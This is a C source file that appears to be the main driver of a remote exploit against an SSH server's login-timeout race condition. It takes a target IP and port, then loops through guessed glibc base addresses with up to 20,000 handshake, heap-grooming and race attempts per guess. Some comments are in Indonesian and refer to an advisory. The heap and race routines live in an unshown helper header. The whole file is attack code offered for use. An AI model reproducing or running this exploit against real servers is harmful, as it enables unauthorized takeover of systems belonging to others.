#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include "helper.h"

#define MAX_PACKET_SIZE (256 * 1024)
#define LOGIN_GRACE_TIME 120
#define MAX_STARTUPS 100
#define CHUNK_ALIGN(s) (((s) + 15) & ~15)

int perform_ssh_handshake(int sock);  // Deklarasi fungsi
int attempt_race_condition(int sock, double parsing_time, uint64_t glibc_base);  // Deklarasi fungsi

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <ip> <port>\n", argv[0]);
        exit(1);
    }

    const char *ip = argv[1];
    int port = atoi(argv[2]);
    double parsing_time = 0;
    int success = 0;

    srand(time(NULL));

    // Attempt exploitation for each possible glibc base address
    for (int base_idx = 0; base_idx < NUM_GLIBC_BASES && !success; base_idx++) {
        uint64_t glibc_base = GLIBC_BASES[base_idx];
        printf("Attempting exploitation with glibc base: 0x%lx\n", glibc_base);

        // The advisory mentions "~10,000 tries on average"
        for (int attempt = 0; attempt < 20000 && !success; attempt++) {
            if (attempt % 1000 == 0) {
                printf("Attempt %d of 20000\n", attempt);
            }

            int sock = setup_connection(ip, port);
            if (sock < 0) {
                fprintf(stderr, "Failed to establish connection, attempt %d\n", attempt);
                continue;
            }

            if (perform_ssh_handshake(sock) < 0) {
                fprintf(stderr, "SSH handshake failed, attempt %d\n", attempt);
                close(sock);
                continue;
            }

            prepare_heap(sock);
            time_final_packet(sock, &parsing_time);

            if (attempt_race_condition(sock, parsing_time, glibc_base)) {
                printf("Possible exploitation success on attempt %d with glibc base 0x%lx!\n", attempt, glibc_base);
                success = 1;
                break;
            }

            close(sock);
            usleep(100000); // 100ms delay between attempts, as mentioned in the advisory
        }
    }

    return !success;
}
